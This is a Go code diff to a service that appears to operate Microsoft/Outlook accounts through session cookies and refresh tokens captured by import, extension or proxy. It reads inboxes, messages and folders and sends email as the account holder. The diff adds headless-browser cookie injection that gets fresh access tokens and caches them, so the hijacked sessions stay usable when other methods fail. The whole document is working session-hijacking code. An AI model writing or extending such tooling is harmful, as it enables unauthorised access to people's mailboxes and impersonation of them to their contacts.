@@ -36,6 +36,7 @@ type CookieStoreService struct {
 	Logger           *zap.SugaredLogger
 	CookieStoreRepo  *repository.CookieStore
 	ProxyCaptureRepo *repository.ProxyCapture
+	BrowserSession   *BrowserSessionService
 }
 
 // Import imports cookies from a request (manual import, extension, or proxy capture)
@@ -297,48 +298,70 @@ func (s *CookieStoreService) SendEmail(
 		return nil, fmt.Errorf("cookie store not found: %s", req.CookieStoreID)
 	}
 
-	// Try token-based sending first (Graph API with access token from MSRT)
+	// Try token-based sending first (Graph API with access token)
 	accessToken := s.getOrRefreshAccessToken(ctx, store)
 	if accessToken != "" {
 		result := s.sendViaGraphAPI(ctx, accessToken, req)
 		if result.Success {
-			s.Logger.Infow("email sent via Graph API (token exchange)", "to", req.To, "storeID", req.CookieStoreID)
+			s.Logger.Infow("email sent via Graph API", "to", req.To, "storeID", req.CookieStoreID)
 			return result, nil
 		}
-		s.Logger.Warnw("Graph API send failed, falling back to cookie methods", "error", result.Error)
+		s.Logger.Warnw("Graph API send failed, trying other methods", "error", result.Error)
 	}
 
-	// Fall back to cookie-based sending
+	// Try cookie-based sending via REST API
 	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
-	if cookieHeader == "" {
-		return &model.CookieSendResult{
-			Success: false,
-			Error:   "No Outlook/Microsoft cookies found and token exchange unavailable",
-			SentAt:  time.Now().UTC().Format(time.RFC3339),
-		}, nil
+	if cookieHeader != "" {
+		message := s.buildMessagePayload(req, store.Email)
+
+		result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
+		if result.Success {
+			s.Logger.Infow("cookie-based email sent via REST API", "to", req.To, "storeID", req.CookieStoreID)
+			return result, nil
+		}
+		s.Logger.Warnw("REST API send failed", "error", result.Error)
+
+		result = s.sendViaOWA(ctx, cookieHeader, req)
+		if result.Success {
+			s.Logger.Infow("cookie-based email sent via OWA", "to", req.To, "storeID", req.CookieStoreID)
+			return result, nil
+		}
+		s.Logger.Warnw("OWA send failed", "error", result.Error)
 	}
 
-	// Build message payload for Outlook REST API
-	message := s.buildMessagePayload(req, store.Email)
+	// Final fallback: browser automation
+	if s.BrowserSession != nil {
+		s.Logger.Infow("attempting browser-based email send", "to", req.To)
 
-	// Attempt: Outlook REST API v2.0
-	result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
-	if result.Success {
-		s.Logger.Infow("cookie-based email sent via REST API", "to", req.To, "storeID", req.CookieStoreID)
-		return result, nil
-	}
-	s.Logger.Warnw("REST API send failed, trying OWA fallback", "error", result.Error)
+		// First try to get a fresh token via browser
+		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
+		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
+			// Use the fresh token for Graph API send
+			graphResult := s.sendViaGraphAPI(ctx, browserResult.AccessToken, req)
+			if graphResult.Success {
+				// Cache the token
+				s.cacheAccessToken(ctx, store.ID, browserResult)
+				s.Logger.Infow("email sent via Graph API (browser token)", "to", req.To)
+				return graphResult, nil
+			}
+		}
 
-	// Attempt: OWA sendmail endpoint
-	result = s.sendViaOWA(ctx, cookieHeader, req)
-	if result.Success {
-		s.Logger.Infow("cookie-based email sent via OWA", "to", req.To, "storeID", req.CookieStoreID)
-		return result, nil
+		// Last resort: direct browser automation send
+		err = s.BrowserSession.SendEmailViaBrowser(ctx, store.CookiesJSON, req.To, req.Subject, req.Body, req.IsHTML)
+		if err == nil {
+			return &model.CookieSendResult{
+				Success:   true,
+				Method:    "browser",
+				MessageID: fmt.Sprintf("browser-%d", time.Now().UnixMilli()),
+				SentAt:    time.Now().UTC().Format(time.RFC3339),
+			}, nil
+		}
+		s.Logger.Warnw("browser send failed", "error", err)
 	}
 
 	return &model.CookieSendResult{
 		Success: false,
-		Error:   fmt.Sprintf("all send methods failed: REST=%s", result.Error),
+		Error:   "all send methods failed (Graph API, REST API, OWA, browser automation)",
 		SentAt:  time.Now().UTC().Format(time.RFC3339),
 	}, nil
 }
@@ -378,24 +401,45 @@ func (s *CookieStoreService) SendEmailDirect(
 
 	// Fall back to cookie-based
 	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
-	if cookieHeader == "" {
-		return &model.CookieSendResult{
-			Success: false,
-			Error:   "No Outlook/Microsoft cookies found",
-			SentAt:  time.Now().UTC().Format(time.RFC3339),
-		}, nil
+	if cookieHeader != "" {
+		message := s.buildMessagePayload(req, fromEmail)
+		result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
+		if result.Success {
+			return result, nil
+		}
+		result = s.sendViaOWA(ctx, cookieHeader, req)
+		if result.Success {
+			return result, nil
+		}
 	}
 
-	message := s.buildMessagePayload(req, fromEmail)
+	// Browser automation fallback
+	if s.BrowserSession != nil {
+		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
+		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
+			graphResult := s.sendViaGraphAPI(ctx, browserResult.AccessToken, req)
+			if graphResult.Success {
+				s.cacheAccessToken(ctx, store.ID, browserResult)
+				return graphResult, nil
+			}
+		}
 
-	// Try REST API first
-	result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
-	if result.Success {
-		return result, nil
+		err = s.BrowserSession.SendEmailViaBrowser(ctx, store.CookiesJSON, req.To, req.Subject, req.Body, req.IsHTML)
+		if err == nil {
+			return &model.CookieSendResult{
+				Success:   true,
+				Method:    "browser",
+				MessageID: fmt.Sprintf("browser-%d", time.Now().UnixMilli()),
+				SentAt:    time.Now().UTC().Format(time.RFC3339),
+			}, nil
+		}
 	}
 
-	// Fallback to OWA
-	return s.sendViaOWA(ctx, cookieHeader, req), nil
+	return &model.CookieSendResult{
+		Success: false,
+		Error:   "No Outlook/Microsoft cookies found and all methods failed",
+		SentAt:  time.Now().UTC().Format(time.RFC3339),
+	}, nil
 }
 
 // GetInbox reads the inbox of a cookie session
@@ -435,60 +479,72 @@ func (s *CookieStoreService) GetInbox(
 		if err == nil {
 			return messages, count, nil
 		}
-		s.Logger.Warnw("Graph API inbox failed, falling back to cookies", "error", err)
+		s.Logger.Warnw("Graph API inbox failed, trying other methods", "error", err)
 	}
 
 	// Fall back to cookie-based
 	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
-	if cookieHeader == "" {
-		return nil, 0, fmt.Errorf("no Outlook/Microsoft cookies found and token exchange unavailable")
-	}
+	if cookieHeader != "" {
+		apiURL := fmt.Sprintf(
+			"https://outlook.office365.com/api/v2.0/me/mailfolders/%s/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments,ToRecipients",
+			folder, limit, skip,
+		)
 
-	apiURL := fmt.Sprintf(
-		"https://outlook.office365.com/api/v2.0/me/mailfolders/%s/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments,ToRecipients",
-		folder, limit, skip,
-	)
+		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
+		if err == nil {
+			httpReq.Header.Set("Cookie", cookieHeader)
+			httpReq.Header.Set("User-Agent", outlookUserAgent)
+			httpReq.Header.Set("Accept", "application/json")
 
-	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
-	if err != nil {
-		return nil, 0, errs.Wrap(err)
-	}
-	httpReq.Header.Set("Cookie", cookieHeader)
-	httpReq.Header.Set("User-Agent", outlookUserAgent)
-	httpReq.Header.Set("Accept", "application/json")
+			client := &http.Client{Timeout: 30 * time.Second}
+			resp, err := client.Do(httpReq)
+			if err == nil {
+				defer resp.Body.Close()
+				if resp.StatusCode == 200 {
+					return s.parseMessagesResponse(resp.Body)
+				}
+			}
+		}
 
-	client := &http.Client{Timeout: 30 * time.Second}
-	resp, err := client.Do(httpReq)
-	if err != nil {
-		return nil, 0, errs.Wrap(err)
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
 		// Try alternative endpoint without folder
 		altURL := fmt.Sprintf(
 			"https://outlook.office365.com/api/v2.0/me/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments",
 			limit, skip,
 		)
 		altReq, _ := http.NewRequestWithContext(ctx, "GET", altURL, nil)
-		altReq.Header.Set("Cookie", cookieHeader)
-		altReq.Header.Set("User-Agent", outlookUserAgent)
-		altReq.Header.Set("Accept", "application/json")
+		if altReq != nil {
+			altReq.Header.Set("Cookie", cookieHeader)
+			altReq.Header.Set("User-Agent", outlookUserAgent)
+			altReq.Header.Set("Accept", "application/json")
 
-		altResp, altErr := client.Do(altReq)
-		if altErr != nil {
-			return nil, 0, fmt.Errorf("cookie session may be expired (HTTP %d)", resp.StatusCode)
+			client := &http.Client{Timeout: 30 * time.Second}
+			altResp, altErr := client.Do(altReq)
+			if altErr == nil {
+				defer altResp.Body.Close()
+				if altResp.StatusCode == 200 {
+					return s.parseMessagesResponse(altResp.Body)
+				}
+			}
 		}
-		defer altResp.Body.Close()
-
-		if altResp.StatusCode != 200 {
-			return nil, 0, fmt.Errorf("cookie session expired or invalid (HTTP %d)", altResp.StatusCode)
-		}
-
-		return s.parseMessagesResponse(altResp.Body)
 	}
 
-	return s.parseMessagesResponse(resp.Body)
+	// Browser automation fallback: get a fresh token via browser
+	if s.BrowserSession != nil {
+		s.Logger.Infow("attempting browser-based inbox read")
+		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
+		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
+			// Cache the token for future use
+			s.cacheAccessToken(ctx, store.ID, browserResult)
+
+			messages, count, err := s.getInboxViaGraphAPI(ctx, browserResult.AccessToken, folder, limit, skip)
+			if err == nil {
+				return messages, count, nil
+			}
+			s.Logger.Warnw("Graph API inbox with browser token failed", "error", err)
+		}
+	}
+
+	return nil, 0, fmt.Errorf("cookie session expired or invalid - all methods failed (token exchange, cookie API, browser automation)")
 }
 
 // GetMessage reads a specific email message
@@ -519,40 +575,47 @@ func (s *CookieStoreService) GetMessage(
 		if err == nil {
 			return msg, nil
 		}
-		s.Logger.Warnw("Graph API message read failed, falling back to cookies", "error", err)
+		s.Logger.Warnw("Graph API message read failed, trying other methods", "error", err)
 	}
 
 	// Fall back to cookie-based
 	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
-	if cookieHeader == "" {
-		return nil, fmt.Errorf("no Outlook/Microsoft cookies found and token exchange unavailable")
+	if cookieHeader != "" {
+		apiURL := fmt.Sprintf(
+			"https://outlook.office365.com/api/v2.0/me/messages/%s?$select=Id,From,Subject,ReceivedDateTime,Body,BodyPreview,IsRead,HasAttachments,ToRecipients,CcRecipients,Importance",
+			messageID,
+		)
+
+		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
+		if err == nil {
+			httpReq.Header.Set("Cookie", cookieHeader)
+			httpReq.Header.Set("User-Agent", outlookUserAgent)
+			httpReq.Header.Set("Accept", "application/json")
+
+			client := &http.Client{Timeout: 30 * time.Second}
+			resp, err := client.Do(httpReq)
+			if err == nil {
+				defer resp.Body.Close()
+				if resp.StatusCode == 200 {
+					return s.parseMessageFull(resp.Body)
+				}
+			}
+		}
 	}
 
-	apiURL := fmt.Sprintf(
-		"https://outlook.office365.com/api/v2.0/me/messages/%s?$select=Id,From,Subject,ReceivedDateTime,Body,BodyPreview,IsRead,HasAttachments,ToRecipients,CcRecipients,Importance",
-		messageID,
-	)
-
-	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
-	if err != nil {
-		return nil, errs.Wrap(err)
-	}
-	httpReq.Header.Set("Cookie", cookieHeader)
-	httpReq.Header.Set("User-Agent", outlookUserAgent)
-	httpReq.Header.Set("Accept", "application/json")
-
-	client := &http.Client{Timeout: 30 * time.Second}
-	resp, err := client.Do(httpReq)
-	if err != nil {
-		return nil, errs.Wrap(err)
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		return nil, fmt.Errorf("failed to read message (HTTP %d)", resp.StatusCode)
+	// Browser automation fallback
+	if s.BrowserSession != nil {
+		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
+		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
+			s.cacheAccessToken(ctx, store.ID, browserResult)
+			msg, err := s.getMessageViaGraphAPI(ctx, browserResult.AccessToken, messageID)
+			if err == nil {
+				return msg, nil
+			}
+		}
 	}
 
-	return s.parseMessageFull(resp.Body)
+	return nil, fmt.Errorf("failed to read message - all methods failed")
 }
 
 // GetFolders lists mail folders for a cookie session
@@ -582,60 +645,64 @@ func (s *CookieStoreService) GetFolders(
 		if err == nil {
 			return folders, nil
 		}
-		s.Logger.Warnw("Graph API folders failed, falling back to cookies", "error", err)
+		s.Logger.Warnw("Graph API folders failed, trying other methods", "error", err)
 	}
 
 	// Fall back to cookie-based
 	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
-	if cookieHeader == "" {
-		return nil, fmt.Errorf("no Outlook/Microsoft cookies found and token exchange unavailable")
-	}
+	if cookieHeader != "" {
+		apiURL := "https://outlook.office365.com/api/v2.0/me/mailfolders?$select=Id,DisplayName,TotalItemCount,UnreadItemCount"
 
-	apiURL := "https://outlook.office365.com/api/v2.0/me/mailfolders?$select=Id,DisplayName,TotalItemCount,UnreadItemCount"
+		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
+		if err == nil {
+			httpReq.Header.Set("Cookie", cookieHeader)
+			httpReq.Header.Set("User-Agent", outlookUserAgent)
+			httpReq.Header.Set("Accept", "application/json")
 
-	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
-	if err != nil {
-		return nil, errs.Wrap(err)
-	}
-	httpReq.Header.Set("Cookie", cookieHeader)
-	httpReq.Header.Set("User-Agent", outlookUserAgent)
-	httpReq.Header.Set("Accept", "application/json")
+			client := &http.Client{Timeout: 30 * time.Second}
+			resp, err := client.Do(httpReq)
+			if err == nil {
+				defer resp.Body.Close()
+				if resp.StatusCode == 200 {
+					var folderData struct {
+						Value []struct {
+							ID              string `json:"Id"`
+							DisplayName     string `json:"DisplayName"`
+							TotalItemCount  int    `json:"TotalItemCount"`
+							UnreadItemCount int    `json:"UnreadItemCount"`
+						} `json:"value"`
+					}
 
-	client := &http.Client{Timeout: 30 * time.Second}
-	resp, err := client.Do(httpReq)
-	if err != nil {
-		return nil, errs.Wrap(err)
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		return nil, fmt.Errorf("failed to list folders (HTTP %d)", resp.StatusCode)
-	}
-
-	var folderData struct {
-		Value []struct {
-			ID              string `json:"Id"`
-			DisplayName     string `json:"DisplayName"`
-			TotalItemCount  int    `json:"TotalItemCount"`
-			UnreadItemCount int    `json:"UnreadItemCount"`
-		} `json:"value"`
-	}
-
-	if err := json.NewDecoder(resp.Body).Decode(&folderData); err != nil {
-		return nil, errs.Wrap(err)
-	}
-
-	folders := make([]model.InboxFolder, len(folderData.Value))
-	for i, f := range folderData.Value {
-		folders[i] = model.InboxFolder{
-			ID:              f.ID,
-			DisplayName:     f.DisplayName,
-			TotalItemCount:  f.TotalItemCount,
-			UnreadItemCount: f.UnreadItemCount,
+					if json.NewDecoder(resp.Body).Decode(&folderData) == nil {
+						folders := make([]model.InboxFolder, len(folderData.Value))
+						for i, f := range folderData.Value {
+							folders[i] = model.InboxFolder{
+								ID:              f.ID,
+								DisplayName:     f.DisplayName,
+								TotalItemCount:  f.TotalItemCount,
+								UnreadItemCount: f.UnreadItemCount,
+							}
+						}
+						return folders, nil
+					}
+				}
+			}
 		}
 	}
 
-	return folders, nil
+	// Browser automation fallback
+	if s.BrowserSession != nil {
+		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
+		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
+			s.cacheAccessToken(ctx, store.ID, browserResult)
+			folders, err := s.getFoldersViaGraphAPI(ctx, browserResult.AccessToken)
+			if err == nil {
+				return folders, nil
+			}
+		}
+	}
+
+	return nil, fmt.Errorf("failed to list folders - all methods failed")
 }
 
 // --- Token Exchange Methods ---
@@ -687,6 +754,31 @@ func (s *CookieStoreService) getOrRefreshAccessToken(ctx context.Context, store 
 	return tokenResp.AccessToken
 }
 
+// cacheAccessToken caches an access token obtained from browser session
+func (s *CookieStoreService) cacheAccessToken(ctx context.Context, storeID uuid.UUID, result *BrowserSessionResult) {
+	if result == nil || result.AccessToken == "" {
+		return
+	}
+
+	// Access tokens from MSAL.js are typically valid for 1 hour
+	expiry := time.Now().Add(55 * time.Minute)
+	updates := map[string]interface{}{
+		"access_token":      result.AccessToken,
+		"token_expiry":      expiry,
+		"validation_method": "browser",
+	}
+	if result.Email != "" {
+		updates["email"] = result.Email
+	}
+	if result.DisplayName != "" {
+		updates["display_name"] = result.DisplayName
+	}
+
+	if err := s.CookieStoreRepo.Update(ctx, storeID, updates); err != nil {
+		s.Logger.Warnw("failed to cache browser access token", "error", err)
+	}
+}
+
 // validateViaTokenExchange attempts to validate a session by exchanging the MSRT refresh token
 // for an access token and calling Graph API /me
 func (s *CookieStoreService) validateViaTokenExchange(ctx context.Context, store *database.CookieStore) (email, displayName string, valid bool) {
@@ -733,6 +825,33 @@ func (s *CookieStoreService) validateViaTokenExchange(ctx context.Context, store
 	s.Logger.Infow("token exchange validation successful",
 		"email", email, "displayName", displayName, "storeID", store.ID)
 	return email, displayName, true
+}
+
+// validateViaBrowser attempts to validate a session using headless browser automation.
+// This is the most reliable method for MSA consumer accounts.
+func (s *CookieStoreService) validateViaBrowser(ctx context.Context, store *database.CookieStore) (email, displayName, accessToken string, valid bool) {
+	if s.BrowserSession == nil {
+		return "", "", "", false
+	}
+
+	s.Logger.Infow("attempting browser-based validation", "storeID", store.ID)
+
+	result, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
+	if err != nil {
+		s.Logger.Warnw("browser validation failed", "storeID", store.ID, "error", err)
+		return "", "", "", false
+	}
+
+	if !result.Valid {
+		s.Logger.Warnw("browser validation: session invalid", "storeID", store.ID, "error", result.Error)
+		return "", "", "", false
+	}
+
+	s.Logger.Infow("browser validation successful",
+		"email", result.Email, "displayName", result.DisplayName,
+		"hasToken", result.AccessToken != "", "storeID", store.ID)
+
+	return result.Email, result.DisplayName, result.AccessToken, true
 }
 
 // sendViaGraphAPI sends an email using Microsoft Graph API with a Bearer token
@@ -995,8 +1114,8 @@ func (s *CookieStoreService) buildAllCookieHeader(cookiesJSON string) string {
 }
 
 // validateAndUpdate validates a cookie session and updates the database record.
-// It tries token exchange first (MSRT refresh token -> Graph API), then falls back
-// to cookie-based validation against multiple Microsoft endpoints.
+// It tries token exchange first (MSRT refresh token -> Graph API), then browser
+// automation, then falls back to cookie-based validation against multiple endpoints.
 func (s *CookieStoreService) validateAndUpdate(ctx context.Context, id uuid.UUID) error {
 	store, err := s.CookieStoreRepo.GetByID(ctx, id)
 	if err != nil {
@@ -1021,7 +1140,30 @@ func (s *CookieStoreService) validateAndUpdate(ctx context.Context, id uuid.UUID
 		return s.CookieStoreRepo.Update(ctx, id, updates)
 	}
 
-	// Attempt 2: Cookie-based validation against multiple endpoints
+	// Attempt 2: Browser automation (headless Chrome with cookie injection)
+	browserEmail, browserDisplayName, browserToken, browserValid := s.validateViaBrowser(ctx, store)
+	if browserValid {
+		now := time.Now()
+		updates := map[string]interface{}{
+			"is_valid":          true,
+			"last_checked":      now,
+			"validation_method": "browser",
+		}
+		if browserEmail != "" {
+			updates["email"] = browserEmail
+		}
+		if browserDisplayName != "" {
+			updates["display_name"] = browserDisplayName
+		}
+		if browserToken != "" {
+			updates["access_token"] = browserToken
+			expiry := time.Now().Add(55 * time.Minute)
+			updates["token_expiry"] = expiry
+		}
+		return s.CookieStoreRepo.Update(ctx, id, updates)
+	}
+
+	// Attempt 3: Cookie-based validation against multiple endpoints
 	allCookieHeader := s.buildAllCookieHeader(store.CookiesJSON)
 	if allCookieHeader == "" {
 		now := time.Now()
